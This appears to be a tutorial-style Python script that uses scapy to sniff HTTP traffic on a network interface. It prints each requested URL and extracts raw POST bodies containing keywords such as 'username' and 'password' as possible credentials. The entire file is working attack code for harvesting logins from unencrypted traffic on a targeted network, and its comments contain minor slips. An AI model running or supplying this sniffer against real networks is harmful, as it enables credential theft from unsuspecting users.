import scapy.all as scapy
from scapy.layers import http
# To be able to filter HTTP packets  we need to install the module


def sniff(interface):
  scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
  # The argument 'store' tells scapy to not store packets in memory
  # prn lets us specify a callback function, which will be called each
  # time we capture a package
  # The 'filter' argument allows us to filter packets (data)

def get_url(packet):
  return str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)

def get_login_info(packet):
  if packet.haslayer(scapy.Raw):
        # Post methods are usually included in the
        # 'Raw' lawyer
    load = str(packet[scapy.Raw].load)
        # We only want to print the Raw lawyer and the
        # 'load' field
    keywords = ["username","uname","login","password","pass","pwd"]
    for keyword in keywords:
      if keyword in load:
        return load

def process_sniffed_packet(packet):
  if packet.haslayer(http.HTTPRequest):
    url = get_url(packet)
    print("[+] HTTP Request >>" + url)

    login_info = get_login_info(packet)
    if login_info:
      print("\n\n[+] Possible username/password >> " + login_info + "\n\n")
    
      

sniff("en0")
# eth0 is the interface that is connected to the network that you are targeting